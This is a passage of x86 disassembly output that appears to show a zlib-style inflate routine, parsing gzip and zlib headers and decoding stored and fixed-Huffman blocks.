   1ba81:	call   0x1daa0
   1ba86:	add    esp,0xc
   1ba89:	mov    DWORD PTR [esi+0x30],ebx
   1ba8c:	mov    eax,DWORD PTR [esi+0x28]
   1ba8f:	mov    DWORD PTR [esi+0x2c],eax
   1ba92:	jmp    0x1bab1
   1ba94:	add    DWORD PTR [esi+0x30],eax
   1ba97:	mov    ecx,DWORD PTR [esi+0x30]
   1ba9a:	mov    edx,DWORD PTR [esi+0x28]
   1ba9d:	cmp    ecx,edx
   1ba9f:	jne    0x1baa5
   1baa1:	and    DWORD PTR [esi+0x30],0x0
   1baa5:	mov    ecx,DWORD PTR [esi+0x2c]
   1baa8:	cmp    ecx,edx
   1baaa:	jae    0x1bab1
   1baac:	add    ecx,eax
   1baae:	mov    DWORD PTR [esi+0x2c],ecx
   1bab1:	xor    eax,eax
   1bab3:	pop    esi
   1bab4:	pop    ebx
   1bab5:	leave  
   1bab6:	ret    
   1bab7:	int3   
   1bab8:	int3   
   1bab9:	int3   
   1baba:	int3   
   1babb:	int3   
   1babc:	mov    edi,edi
   1babe:	push   ebp
   1babf:	mov    ebp,esp
   1bac1:	mov    edx,DWORD PTR [ebp+0x8]
   1bac4:	sub    esp,0x2c
   1bac7:	push   ebx
   1bac8:	xor    eax,eax
   1baca:	push   esi
   1bacb:	push   edi
   1bacc:	cmp    edx,eax
   1bace:	je     0x1bb1e
   1bad0:	mov    esi,DWORD PTR [edx+0x1c]
   1bad3:	cmp    esi,eax
   1bad5:	je     0x1bb1e
   1bad7:	cmp    DWORD PTR [edx+0xc],eax
   1bada:	je     0x1bb1e
   1badc:	cmp    DWORD PTR [edx],eax
   1bade:	jne    0x1bae5
   1bae0:	cmp    DWORD PTR [edx+0x4],eax
   1bae3:	jne    0x1bb1e
   1bae5:	cmp    DWORD PTR [esi],0xb
   1bae8:	jne    0x1baf0
   1baea:	mov    DWORD PTR [esi],0xc
   1baf0:	mov    eax,DWORD PTR [edx+0xc]
   1baf3:	mov    ecx,DWORD PTR [edx+0x10]
   1baf6:	and    DWORD PTR [ebp-0x24],0x0
   1bafa:	mov    ebx,DWORD PTR [esi+0x38]
   1bafd:	mov    edi,DWORD PTR [esi+0x3c]
   1bb00:	mov    DWORD PTR [ebp-0x18],eax
   1bb03:	mov    eax,DWORD PTR [edx]
   1bb05:	mov    DWORD PTR [ebp-0x4],eax
   1bb08:	mov    eax,DWORD PTR [edx+0x4]
   1bb0b:	mov    DWORD PTR [ebp-0x8],eax
   1bb0e:	mov    DWORD PTR [ebp-0x2c],eax
   1bb11:	mov    eax,DWORD PTR [esi]
   1bb13:	mov    DWORD PTR [ebp-0x14],ecx
   1bb16:	mov    DWORD PTR [ebp-0x1c],ecx
   1bb19:	cmp    eax,0x1c
   1bb1c:	jbe    0x1bb2b
   1bb1e:	push   0xfffffffe
   1bb20:	pop    eax
   1bb21:	pop    edi
   1bb22:	pop    esi
   1bb23:	pop    ebx
   1bb24:	leave  
   1bb25:	ret    0x8
   1bb28:	mov    edx,DWORD PTR [ebp+0x8]
   1bb2b:	jmp    DWORD PTR [eax*4+0x1cc68]
   1bb32:	mov    eax,DWORD PTR [esi+0x8]
   1bb35:	test   eax,eax
   1bb37:	jne    0x1bb63
   1bb39:	mov    DWORD PTR [esi],0xc
   1bb3f:	jmp    0x1cb38
   1bb44:	cmp    DWORD PTR [ebp-0x8],0x0
   1bb48:	je     0x1cb86
   1bb4e:	mov    ecx,DWORD PTR [ebp-0x4]
   1bb51:	movzx  edx,BYTE PTR [ecx]
   1bb54:	dec    DWORD PTR [ebp-0x8]
   1bb57:	mov    ecx,edi
   1bb59:	shl    edx,cl
   1bb5b:	add    ebx,edx
   1bb5d:	inc    DWORD PTR [ebp-0x4]
   1bb60:	add    edi,0x8
   1bb63:	cmp    edi,0x10
   1bb66:	jb     0x1bb44
   1bb68:	test   al,0x2
   1bb6a:	je     0x1bba7
   1bb6c:	cmp    ebx,0x8b1f
   1bb72:	jne    0x1bba7
   1bb74:	xor    edi,edi
   1bb76:	push   edi
   1bb77:	push   edi
   1bb78:	push   edi
   1bb79:	call   0x1d9ea
   1bb7e:	mov    DWORD PTR [esi+0x18],eax
   1bb81:	push   0x2
   1bb83:	lea    eax,[ebp-0x10]
   1bb86:	push   eax
   1bb87:	mov    BYTE PTR [ebp-0x10],0x1f
   1bb8b:	mov    BYTE PTR [ebp-0xf],0x8b
   1bb8f:	push   DWORD PTR [esi+0x18]
   1bb92:	call   0x1d9ea
   1bb97:	mov    DWORD PTR [esi+0x18],eax
   1bb9a:	xor    ebx,ebx
   1bb9c:	mov    DWORD PTR [esi],0x1
   1bba2:	jmp    0x1cb38
   1bba7:	mov    eax,DWORD PTR [esi+0x20]
   1bbaa:	and    DWORD PTR [esi+0x10],0x0
   1bbae:	test   eax,eax
   1bbb0:	je     0x1bbb6
   1bbb2:	or     DWORD PTR [eax+0x30],0xffffffff
   1bbb6:	test   BYTE PTR [esi+0x8],0x1
   1bbba:	je     0x1bc40
   1bbc0:	movzx  eax,bl
   1bbc3:	shl    eax,0x8
   1bbc6:	mov    ecx,ebx
   1bbc8:	shr    ecx,0x8
   1bbcb:	add    eax,ecx
   1bbcd:	push   0x1f
   1bbcf:	xor    edx,edx
   1bbd1:	pop    ecx
   1bbd2:	div    ecx
   1bbd4:	test   edx,edx
   1bbd6:	jne    0x1bc40
   1bbd8:	mov    eax,ebx
   1bbda:	and    al,0xf
   1bbdc:	cmp    al,0x8
   1bbde:	je     0x1bbef
   1bbe0:	mov    eax,DWORD PTR [ebp+0x8]
   1bbe3:	mov    DWORD PTR [eax+0x18],0x1ede4
   1bbea:	jmp    0x1cb32
   1bbef:	shr    ebx,0x4
   1bbf2:	mov    ecx,ebx
   1bbf4:	and    ecx,0xf
   1bbf7:	add    ecx,0x8
   1bbfa:	sub    edi,0x4
   1bbfd:	cmp    ecx,DWORD PTR [esi+0x24]
   1bc00:	jbe    0x1bc11
   1bc02:	mov    eax,DWORD PTR [ebp+0x8]
   1bc05:	mov    DWORD PTR [eax+0x18],0x1edd0
   1bc0c:	jmp    0x1cb32
   1bc11:	xor    eax,eax
   1bc13:	xor    edi,edi
   1bc15:	inc    eax
   1bc16:	push   edi
   1bc17:	shl    eax,cl
   1bc19:	push   edi
   1bc1a:	push   edi
   1bc1b:	mov    DWORD PTR [esi+0x14],eax
   1bc1e:	call   0x1d548
   1bc23:	mov    ecx,DWORD PTR [ebp+0x8]
   1bc26:	shr    ebx,0x8
   1bc29:	not    ebx
   1bc2b:	and    ebx,0x2
   1bc2e:	or     ebx,0x9
   1bc31:	mov    DWORD PTR [esi+0x18],eax
   1bc34:	mov    DWORD PTR [ecx+0x30],eax
   1bc37:	mov    DWORD PTR [esi],ebx
   1bc39:	xor    ebx,ebx
   1bc3b:	jmp    0x1cb38
   1bc40:	mov    eax,DWORD PTR [ebp+0x8]
   1bc43:	mov    DWORD PTR [eax+0x18],0x1edb8
   1bc4a:	mov    DWORD PTR [esi],0x1b
   1bc50:	nop
   1bc51:	jmp    0x1cb38
   1bc56:	cmp    edi,0x10
   1bc59:	jae    0x1bc82
   1bc5b:	cmp    DWORD PTR [ebp-0x8],0x0
   1bc5f:	je     0x1cb86
   1bc65:	mov    eax,DWORD PTR [ebp-0x4]
   1bc68:	movzx  eax,BYTE PTR [eax]
   1bc6b:	dec    DWORD PTR [ebp-0x8]
   1bc6e:	mov    ecx,edi
   1bc70:	shl    eax,cl
   1bc72:	add    edi,0x8
   1bc75:	add    ebx,eax
   1bc77:	inc    DWORD PTR [ebp-0x4]
   1bc7a:	cmp    edi,0x10
   1bc7d:	jb     0x1bc5b
   1bc7f:	mov    edx,DWORD PTR [ebp+0x8]
   1bc82:	mov    DWORD PTR [esi+0x10],ebx
   1bc85:	cmp    bl,0x8
   1bc88:	je     0x1bc96
   1bc8a:	mov    DWORD PTR [edx+0x18],0x1ede4
   1bc91:	jmp    0x1cb32
   1bc96:	test   ebx,0xe000
   1bc9c:	je     0x1bcaa
   1bc9e:	mov    DWORD PTR [edx+0x18],0x1ed9e
   1bca5:	jmp    0x1cb32
   1bcaa:	mov    eax,DWORD PTR [esi+0x20]
   1bcad:	test   eax,eax
   1bcaf:	je     0x1bcbb
   1bcb1:	mov    ecx,ebx
   1bcb3:	shr    ecx,0x8
   1bcb6:	and    ecx,0x1
   1bcb9:	mov    DWORD PTR [eax],ecx
   1bcbb:	test   DWORD PTR [esi+0x10],0x200
   1bcc2:	je     0x1bce1
   1bcc4:	mov    BYTE PTR [ebp-0x10],bl
   1bcc7:	push   0x2
   1bcc9:	lea    eax,[ebp-0x10]
   1bccc:	shr    ebx,0x8
   1bccf:	push   eax
   1bcd0:	mov    BYTE PTR [ebp-0xf],bl
   1bcd3:	push   DWORD PTR [esi+0x18]
   1bcd6:	call   0x1d9ea
   1bcdb:	mov    edx,DWORD PTR [ebp+0x8]
   1bcde:	mov    DWORD PTR [esi+0x18],eax
   1bce1:	xor    ebx,ebx
   1bce3:	xor    edi,edi
   1bce5:	mov    DWORD PTR [esi],0x2
   1bceb:	cmp    edi,0x20
   1bcee:	jae    0x1bd17
   1bcf0:	cmp    DWORD PTR [ebp-0x8],0x0
   1bcf4:	je     0x1cb86
   1bcfa:	mov    eax,DWORD PTR [ebp-0x4]
   1bcfd:	movzx  eax,BYTE PTR [eax]
   1bd00:	dec    DWORD PTR [ebp-0x8]
   1bd03:	mov    ecx,edi
   1bd05:	shl    eax,cl
   1bd07:	add    edi,0x8
   1bd0a:	add    ebx,eax
   1bd0c:	inc    DWORD PTR [ebp-0x4]
   1bd0f:	cmp    edi,0x20
   1bd12:	jb     0x1bcf0
   1bd14:	mov    edx,DWORD PTR [ebp+0x8]
   1bd17:	mov    eax,DWORD PTR [esi+0x20]
   1bd1a:	test   eax,eax
   1bd1c:	je     0x1bd21
   1bd1e:	mov    DWORD PTR [eax+0x4],ebx
   1bd21:	test   DWORD PTR [esi+0x10],0x200
   1bd28:	je     0x1bd57
   1bd2a:	mov    eax,ebx
   1bd2c:	shr    eax,0x8
   1bd2f:	mov    BYTE PTR [ebp-0xf],al
   1bd32:	mov    eax,ebx
   1bd34:	shr    eax,0x10
   1bd37:	mov    BYTE PTR [ebp-0xe],al
   1bd3a:	mov    BYTE PTR [ebp-0x10],bl
   1bd3d:	push   0x4
   1bd3f:	lea    eax,[ebp-0x10]
   1bd42:	shr    ebx,0x18
   1bd45:	push   eax
   1bd46:	mov    BYTE PTR [ebp-0xd],bl
   1bd49:	push   DWORD PTR [esi+0x18]
   1bd4c:	call   0x1d9ea
   1bd51:	mov    edx,DWORD PTR [ebp+0x8]
   1bd54:	mov    DWORD PTR [esi+0x18],eax
   1bd57:	xor    ebx,ebx
   1bd59:	xor    edi,edi
   1bd5b:	mov    DWORD PTR [esi],0x3
   1bd61:	cmp    edi,0x10
   1bd64:	jae    0x1bd8d
   1bd66:	cmp    DWORD PTR [ebp-0x8],0x0
   1bd6a:	je     0x1cb86
   1bd70:	mov    eax,DWORD PTR [ebp-0x4]
   1bd73:	movzx  eax,BYTE PTR [eax]
   1bd76:	dec    DWORD PTR [ebp-0x8]
   1bd79:	mov    ecx,edi
   1bd7b:	shl    eax,cl
   1bd7d:	add    edi,0x8
   1bd80:	add    ebx,eax
   1bd82:	inc    DWORD PTR [ebp-0x4]
   1bd85:	cmp    edi,0x10
   1bd88:	jb     0x1bd66
   1bd8a:	mov    edx,DWORD PTR [ebp+0x8]
   1bd8d:	mov    eax,DWORD PTR [esi+0x20]
   1bd90:	test   eax,eax
   1bd92:	je     0x1bdaa
   1bd94:	mov    ecx,ebx
   1bd96:	and    ecx,0xff
   1bd9c:	mov    DWORD PTR [eax+0x8],ecx
   1bd9f:	mov    ecx,DWORD PTR [esi+0x20]
   1bda2:	mov    eax,ebx
   1bda4:	shr    eax,0x8
   1bda7:	mov    DWORD PTR [ecx+0xc],eax
   1bdaa:	test   DWORD PTR [esi+0x10],0x200
   1bdb1:	je     0x1bdd0
   1bdb3:	mov    BYTE PTR [ebp-0x10],bl
   1bdb6:	push   0x2
   1bdb8:	lea    eax,[ebp-0x10]
   1bdbb:	shr    ebx,0x8
   1bdbe:	push   eax
   1bdbf:	mov    BYTE PTR [ebp-0xf],bl
   1bdc2:	push   DWORD PTR [esi+0x18]
   1bdc5:	call   0x1d9ea
   1bdca:	mov    edx,DWORD PTR [ebp+0x8]
   1bdcd:	mov    DWORD PTR [esi+0x18],eax
   1bdd0:	xor    ebx,ebx
   1bdd2:	xor    edi,edi
   1bdd4:	mov    DWORD PTR [esi],0x4
   1bdda:	test   DWORD PTR [esi+0x10],0x400
   1bde1:	je     0x1be48
   1bde3:	cmp    edi,0x10
   1bde6:	jae    0x1be0f
   1bde8:	cmp    DWORD PTR [ebp-0x8],0x0
   1bdec:	je     0x1cb86
   1bdf2:	mov    eax,DWORD PTR [ebp-0x4]
   1bdf5:	movzx  eax,BYTE PTR [eax]
   1bdf8:	dec    DWORD PTR [ebp-0x8]
   1bdfb:	mov    ecx,edi
   1bdfd:	shl    eax,cl
   1bdff:	add    edi,0x8
   1be02:	add    ebx,eax
   1be04:	inc    DWORD PTR [ebp-0x4]
   1be07:	cmp    edi,0x10
   1be0a:	jb     0x1bde8
   1be0c:	mov    edx,DWORD PTR [ebp+0x8]
   1be0f:	mov    eax,DWORD PTR [esi+0x20]
   1be12:	mov    DWORD PTR [esi+0x40],ebx
   1be15:	test   eax,eax
   1be17:	je     0x1be1c
   1be19:	mov    DWORD PTR [eax+0x14],ebx
   1be1c:	test   DWORD PTR [esi+0x10],0x200
   1be23:	je     0x1be42
   1be25:	mov    BYTE PTR [ebp-0x10],bl
   1be28:	push   0x2
   1be2a:	lea    eax,[ebp-0x10]
   1be2d:	shr    ebx,0x8
   1be30:	push   eax
   1be31:	mov    BYTE PTR [ebp-0xf],bl
   1be34:	push   DWORD PTR [esi+0x18]
   1be37:	call   0x1d9ea
   1be3c:	mov    edx,DWORD PTR [ebp+0x8]
   1be3f:	mov    DWORD PTR [esi+0x18],eax
   1be42:	xor    ebx,ebx
   1be44:	xor    edi,edi
   1be46:	jmp    0x1be53
   1be48:	mov    eax,DWORD PTR [esi+0x20]
   1be4b:	test   eax,eax
   1be4d:	je     0x1be53
   1be4f:	and    DWORD PTR [eax+0x10],0x0
   1be53:	mov    DWORD PTR [esi],0x5
   1be59:	test   DWORD PTR [esi+0x10],0x400
   1be60:	je     0x1beea
   1be66:	mov    edx,DWORD PTR [esi+0x40]
   1be69:	mov    eax,DWORD PTR [ebp-0x8]
   1be6c:	mov    DWORD PTR [ebp-0xc],edx
   1be6f:	cmp    edx,eax
   1be71:	jbe    0x1be76
   1be73:	mov    DWORD PTR [ebp-0xc],eax
   1be76:	cmp    DWORD PTR [ebp-0xc],0x0
   1be7a:	je     0x1bedd
   1be7c:	mov    ecx,DWORD PTR [esi+0x20]
   1be7f:	test   ecx,ecx
   1be81:	je     0x1beb7
   1be83:	mov    eax,DWORD PTR [ecx+0x10]
   1be86:	mov    DWORD PTR [ebp-0x28],eax
   1be89:	test   eax,eax
   1be8b:	je     0x1beb7
   1be8d:	mov    eax,DWORD PTR [ecx+0x14]
   1be90:	mov    ecx,DWORD PTR [ecx+0x18]
   1be93:	sub    eax,edx
   1be95:	mov    edx,DWORD PTR [ebp-0xc]
   1be98:	add    edx,eax
   1be9a:	cmp    edx,ecx
   1be9c:	jbe    0x1bea2
   1be9e:	sub    ecx,eax
   1bea0:	jmp    0x1bea5
   1bea2:	mov    ecx,DWORD PTR [ebp-0xc]
   1bea5:	push   ecx
   1bea6:	mov    ecx,DWORD PTR [ebp-0x28]
   1bea9:	push   DWORD PTR [ebp-0x4]
   1beac:	add    ecx,eax
   1beae:	push   ecx
   1beaf:	call   0x1daa0
   1beb4:	add    esp,0xc
   1beb7:	test   DWORD PTR [esi+0x10],0x200
   1bebe:	je     0x1bed1
   1bec0:	push   DWORD PTR [ebp-0xc]
   1bec3:	push   DWORD PTR [ebp-0x4]
   1bec6:	push   DWORD PTR [esi+0x18]
   1bec9:	call   0x1d9ea
   1bece:	mov    DWORD PTR [esi+0x18],eax
   1bed1:	mov    eax,DWORD PTR [ebp-0xc]
   1bed4:	sub    DWORD PTR [ebp-0x8],eax
   1bed7:	add    DWORD PTR [ebp-0x4],eax
   1beda:	sub    DWORD PTR [esi+0x40],eax
   1bedd:	cmp    DWORD PTR [esi+0x40],0x0
   1bee1:	jne    0x1cb86
   1bee7:	mov    edx,DWORD PTR [ebp+0x8]
   1beea:	and    DWORD PTR [esi+0x40],0x0
   1beee:	mov    DWORD PTR [esi],0x6
   1bef4:	test   DWORD PTR [esi+0x10],0x800
   1befb:	je     0x1bf78
   1befd:	cmp    DWORD PTR [ebp-0x8],0x0
   1bf01:	je     0x1cb86
   1bf07:	xor    ecx,ecx
   1bf09:	mov    eax,DWORD PTR [ebp-0x4]
   1bf0c:	movzx  eax,BYTE PTR [ecx+eax*1]
   1bf10:	inc    ecx
   1bf11:	mov    DWORD PTR [ebp-0xc],ecx
   1bf14:	mov    ecx,DWORD PTR [esi+0x20]
   1bf17:	mov    DWORD PTR [ebp-0x20],eax
   1bf1a:	test   ecx,ecx
   1bf1c:	je     0x1bf39
   1bf1e:	mov    edx,DWORD PTR [ecx+0x1c]
   1bf21:	mov    DWORD PTR [ebp-0x28],edx
   1bf24:	test   edx,edx
   1bf26:	je     0x1bf39
   1bf28:	mov    edx,DWORD PTR [esi+0x40]
   1bf2b:	cmp    edx,DWORD PTR [ecx+0x20]
   1bf2e:	jae    0x1bf39
   1bf30:	mov    ecx,DWORD PTR [ebp-0x28]
   1bf33:	mov    BYTE PTR [ecx+edx*1],al
   1bf36:	inc    DWORD PTR [esi+0x40]
   1bf39:	test   eax,eax
   1bf3b:	je     0x1bf45
   1bf3d:	mov    ecx,DWORD PTR [ebp-0xc]
   1bf40:	cmp    ecx,DWORD PTR [ebp-0x8]
   1bf43:	jb     0x1bf09
   1bf45:	test   DWORD PTR [esi+0x10],0x200
   1bf4c:	je     0x1bf62
   1bf4e:	push   DWORD PTR [ebp-0xc]
   1bf51:	push   DWORD PTR [ebp-0x4]
   1bf54:	push   DWORD PTR [esi+0x18]
   1bf57:	call   0x1d9ea
   1bf5c:	mov    DWORD PTR [esi+0x18],eax
   1bf5f:	mov    eax,DWORD PTR [ebp-0x20]
   1bf62:	mov    ecx,DWORD PTR [ebp-0xc]
   1bf65:	sub    DWORD PTR [ebp-0x8],ecx
   1bf68:	add    DWORD PTR [ebp-0x4],ecx
   1bf6b:	test   eax,eax
   1bf6d:	jne    0x1cb86
   1bf73:	mov    edx,DWORD PTR [ebp+0x8]
   1bf76:	jmp    0x1bf83
   1bf78:	mov    eax,DWORD PTR [esi+0x20]
   1bf7b:	test   eax,eax
   1bf7d:	je     0x1bf83
   1bf7f:	and    DWORD PTR [eax+0x1c],0x0
   1bf83:	and    DWORD PTR [esi+0x40],0x0
   1bf87:	mov    DWORD PTR [esi],0x7
   1bf8d:	test   DWORD PTR [esi+0x10],0x1000
   1bf94:	je     0x1c011
   1bf96:	cmp    DWORD PTR [ebp-0x8],0x0
   1bf9a:	je     0x1cb86
   1bfa0:	xor    ecx,ecx
   1bfa2:	mov    eax,DWORD PTR [ebp-0x4]
   1bfa5:	movzx  eax,BYTE PTR [ecx+eax*1]
   1bfa9:	inc    ecx
   1bfaa:	mov    DWORD PTR [ebp-0xc],ecx
   1bfad:	mov    ecx,DWORD PTR [esi+0x20]
   1bfb0:	mov    DWORD PTR [ebp-0x20],eax
   1bfb3:	test   ecx,ecx
   1bfb5:	je     0x1bfd2
   1bfb7:	mov    edx,DWORD PTR [ecx+0x24]
   1bfba:	mov    DWORD PTR [ebp-0x28],edx
   1bfbd:	test   edx,edx
   1bfbf:	je     0x1bfd2
   1bfc1:	mov    edx,DWORD PTR [esi+0x40]
   1bfc4:	cmp    edx,DWORD PTR [ecx+0x28]
   1bfc7:	jae    0x1bfd2
   1bfc9:	mov    ecx,DWORD PTR [ebp-0x28]
   1bfcc:	mov    BYTE PTR [ecx+edx*1],al
   1bfcf:	inc    DWORD PTR [esi+0x40]
   1bfd2:	test   eax,eax
   1bfd4:	je     0x1bfde
   1bfd6:	mov    ecx,DWORD PTR [ebp-0xc]
   1bfd9:	cmp    ecx,DWORD PTR [ebp-0x8]
   1bfdc:	jb     0x1bfa2
   1bfde:	test   DWORD PTR [esi+0x10],0x200
   1bfe5:	je     0x1bffb
   1bfe7:	push   DWORD PTR [ebp-0xc]
   1bfea:	push   DWORD PTR [ebp-0x4]
   1bfed:	push   DWORD PTR [esi+0x18]
   1bff0:	call   0x1d9ea
   1bff5:	mov    DWORD PTR [esi+0x18],eax
   1bff8:	mov    eax,DWORD PTR [ebp-0x20]
   1bffb:	mov    ecx,DWORD PTR [ebp-0xc]
   1bffe:	sub    DWORD PTR [ebp-0x8],ecx
   1c001:	add    DWORD PTR [ebp-0x4],ecx
   1c004:	test   eax,eax
   1c006:	jne    0x1cb86
   1c00c:	mov    edx,DWORD PTR [ebp+0x8]
   1c00f:	jmp    0x1c01c
   1c011:	mov    eax,DWORD PTR [esi+0x20]
   1c014:	test   eax,eax
   1c016:	je     0x1c01c
   1c018:	and    DWORD PTR [eax+0x24],0x0
   1c01c:	mov    DWORD PTR [esi],0x8
   1c022:	test   DWORD PTR [esi+0x10],0x200
   1c029:	je     0x1c06f
   1c02b:	cmp    edi,0x10
   1c02e:	jae    0x1c057
   1c030:	cmp    DWORD PTR [ebp-0x8],0x0
   1c034:	je     0x1cb86
   1c03a:	mov    eax,DWORD PTR [ebp-0x4]
   1c03d:	movzx  eax,BYTE PTR [eax]
   1c040:	dec    DWORD PTR [ebp-0x8]
   1c043:	mov    ecx,edi
   1c045:	shl    eax,cl
   1c047:	add    edi,0x8
   1c04a:	add    ebx,eax
   1c04c:	inc    DWORD PTR [ebp-0x4]
   1c04f:	cmp    edi,0x10
   1c052:	jb     0x1c030
   1c054:	mov    edx,DWORD PTR [ebp+0x8]
   1c057:	movzx  eax,WORD PTR [esi+0x18]
   1c05b:	cmp    ebx,eax
   1c05d:	je     0x1c06b
   1c05f:	mov    DWORD PTR [edx+0x18],0x1ed8a
   1c066:	jmp    0x1cb32
   1c06b:	xor    ebx,ebx
   1c06d:	xor    edi,edi
   1c06f:	mov    eax,DWORD PTR [esi+0x20]
   1c072:	test   eax,eax
   1c074:	je     0x1c08a
   1c076:	mov    edx,DWORD PTR [esi+0x10]
   1c079:	xor    ecx,ecx
   1c07b:	inc    ecx
   1c07c:	sar    edx,0x9
   1c07f:	and    edx,ecx
   1c081:	mov    DWORD PTR [eax+0x2c],edx
   1c084:	mov    eax,DWORD PTR [esi+0x20]
   1c087:	mov    DWORD PTR [eax+0x30],ecx
   1c08a:	xor    eax,eax
   1c08c:	push   eax
   1c08d:	push   eax
   1c08e:	push   eax
   1c08f:	call   0x1d9ea
   1c094:	mov    ecx,DWORD PTR [ebp+0x8]
   1c097:	mov    DWORD PTR [esi+0x18],eax
   1c09a:	mov    DWORD PTR [ecx+0x30],eax
   1c09d:	jmp    0x1c79b
   1c0a2:	cmp    edi,0x20
   1c0a5:	jae    0x1c0ce
   1c0a7:	cmp    DWORD PTR [ebp-0x8],0x0
   1c0ab:	je     0x1cb86
   1c0b1:	mov    eax,DWORD PTR [ebp-0x4]
   1c0b4:	movzx  eax,BYTE PTR [eax]
   1c0b7:	dec    DWORD PTR [ebp-0x8]
   1c0ba:	mov    ecx,edi
   1c0bc:	shl    eax,cl
   1c0be:	add    edi,0x8
   1c0c1:	add    ebx,eax
   1c0c3:	inc    DWORD PTR [ebp-0x4]
   1c0c6:	cmp    edi,0x20
   1c0c9:	jb     0x1c0a7
   1c0cb:	mov    edx,DWORD PTR [ebp+0x8]
   1c0ce:	mov    ecx,ebx
   1c0d0:	mov    eax,0xff00
   1c0d5:	and    ecx,eax
   1c0d7:	mov    edi,ebx
   1c0d9:	shl    edi,0x10
   1c0dc:	add    ecx,edi
   1c0de:	mov    edi,ebx
   1c0e0:	shr    edi,0x8
   1c0e3:	and    edi,eax
   1c0e5:	shl    ecx,0x8
   1c0e8:	shr    ebx,0x18
   1c0eb:	add    ecx,edi
   1c0ed:	lea    eax,[ecx+ebx*1]
   1c0f0:	mov    DWORD PTR [esi+0x18],eax
   1c0f3:	mov    DWORD PTR [edx+0x30],eax
   1c0f6:	xor    ebx,ebx
   1c0f8:	xor    edi,edi
   1c0fa:	mov    DWORD PTR [esi],0xa
   1c100:	cmp    DWORD PTR [esi+0xc],0x0
   1c104:	je     0x1cb48
   1c10a:	xor    eax,eax
   1c10c:	push   eax
   1c10d:	push   eax
   1c10e:	push   eax
   1c10f:	call   0x1d548
   1c114:	mov    ecx,DWORD PTR [ebp+0x8]
   1c117:	mov    DWORD PTR [esi+0x18],eax
   1c11a:	mov    DWORD PTR [ecx+0x30],eax
   1c11d:	mov    DWORD PTR [esi],0xb
   1c123:	cmp    DWORD PTR [ebp+0xc],0x5
   1c127:	je     0x1cb86
   1c12d:	mov    edx,DWORD PTR [ebp+0x8]
   1c130:	cmp    DWORD PTR [esi+0x4],0x0
   1c134:	je     0x1c14a
   1c136:	mov    ecx,edi
   1c138:	and    ecx,0x7
   1c13b:	shr    ebx,cl
   1c13d:	sub    edi,ecx
   1c13f:	mov    DWORD PTR [esi],0x18
   1c145:	jmp    0x1cb38
   1c14a:	cmp    edi,0x3
   1c14d:	jae    0x1c176
   1c14f:	cmp    DWORD PTR [ebp-0x8],0x0
   1c153:	je     0x1cb86
   1c159:	mov    eax,DWORD PTR [ebp-0x4]
   1c15c:	movzx  eax,BYTE PTR [eax]
   1c15f:	dec    DWORD PTR [ebp-0x8]
   1c162:	mov    ecx,edi
   1c164:	shl    eax,cl
   1c166:	add    edi,0x8
   1c169:	add    ebx,eax
   1c16b:	inc    DWORD PTR [ebp-0x4]
   1c16e:	cmp    edi,0x3
   1c171:	jb     0x1c14f
   1c173:	mov    edx,DWORD PTR [ebp+0x8]
   1c176:	mov    eax,ebx
   1c178:	and    eax,0x1
   1c17b:	shr    ebx,1
   1c17d:	mov    DWORD PTR [esi+0x4],eax
   1c180:	mov    eax,ebx
   1c182:	and    eax,0x3
   1c185:	dec    edi
   1c186:	sub    eax,0x0
   1c189:	je     0x1c1cf
   1c18b:	dec    eax
   1c18c:	je     0x1c1ab
   1c18e:	dec    eax
   1c18f:	je     0x1c1a3
   1c191:	dec    eax
   1c192:	jne    0x1c1d5
   1c194:	mov    DWORD PTR [edx+0x18],0x1ed76
   1c19b:	mov    DWORD PTR [esi],0x1b
   1c1a1:	jmp    0x1c1d5
   1c1a3:	mov    DWORD PTR [esi],0xf
   1c1a9:	jmp    0x1c1d5
   1c1ab:	mov    DWORD PTR [esi+0x4c],0x7b4c0
   1c1b2:	mov    DWORD PTR [esi+0x54],0x9
   1c1b9:	mov    DWORD PTR [esi+0x50],0x7bcc0
   1c1c0:	mov    DWORD PTR [esi+0x58],0x5
   1c1c7:	mov    DWORD PTR [esi],0x12
   1c1cd:	jmp    0x1c1d5
   1c1cf:	mov    DWORD PTR [esi],0xd
   1c1d5:	shr    ebx,0x2
   1c1d8:	dec    edi
   1c1d9:	dec    edi
   1c1da:	jmp    0x1cb38
   1c1df:	mov    ecx,edi
   1c1e1:	and    ecx,0x7
   1c1e4:	sub    edi,ecx
   1c1e6:	shr    ebx,cl
   1c1e8:	cmp    edi,0x20
   1c1eb:	jae    0x1c214
   1c1ed:	cmp    DWORD PTR [ebp-0x8],0x0
   1c1f1:	je     0x1cb86
   1c1f7:	mov    eax,DWORD PTR [ebp-0x4]
   1c1fa:	movzx  eax,BYTE PTR [eax]
   1c1fd:	dec    DWORD PTR [ebp-0x8]
   1c200:	mov    ecx,edi
   1c202:	shl    eax,cl
   1c204:	add    edi,0x8
   1c207:	add    ebx,eax
   1c209:	inc    DWORD PTR [ebp-0x4]
   1c20c:	cmp    edi,0x20
   1c20f:	jb     0x1c1ed
   1c211:	mov    edx,DWORD PTR [ebp+0x8]
   1c214:	mov    ecx,ebx
   1c216:	mov    eax,ebx
   1c218:	not    ecx
   1c21a:	and    eax,0xffff
   1c21f:	shr    ecx,0x10
   1c222:	cmp    eax,ecx
   1c224:	je     0x1c232
   1c226:	mov    DWORD PTR [edx+0x18],0x1ed58
   1c22d:	jmp    0x1cb32
   1c232:	xor    ebx,ebx
   1c234:	mov    DWORD PTR [esi+0x40],eax
   1c237:	xor    edi,edi
   1c239:	mov    DWORD PTR [esi],0xe
   1c23f:	mov    eax,DWORD PTR [esi+0x40]
   1c242:	mov    DWORD PTR [ebp-0xc],eax
   1c245:	test   eax,eax
   1c247:	je     0x1c79b
   1c24d:	mov    eax,DWORD PTR [ebp-0x8]
   1c250:	cmp    DWORD PTR [ebp-0xc],eax
   1c253:	jbe    0x1c258
   1c255:	mov    DWORD PTR [ebp-0xc],eax
   1c258:	mov    eax,DWORD PTR [ebp-0x14]
   1c25b:	cmp    DWORD PTR [ebp-0xc],eax
   1c25e:	jbe    0x1c263
   1c260:	mov    DWORD PTR [ebp-0xc],eax
   1c263:	cmp    DWORD PTR [ebp-0xc],0x0
   1c267:	je     0x1cb86
   1c26d:	push   DWORD PTR [ebp-0xc]
   1c270:	push   DWORD PTR [ebp-0x4]
   1c273:	push   DWORD PTR [ebp-0x18]
   1c276:	call   0x1daa0
   1c27b:	mov    eax,DWORD PTR [ebp-0xc]
   1c27e:	sub    DWORD PTR [ebp-0x8],eax
   1c281:	add    DWORD PTR [ebp-0x4],eax
   1c284:	sub    DWORD PTR [ebp-0x14],eax
   1c287:	add    DWORD PTR [ebp-0x18],eax
   1c28a:	add    esp,0xc
   1c28d:	sub    DWORD PTR [esi+0x40],eax
   1c290:	jmp    0x1cb38
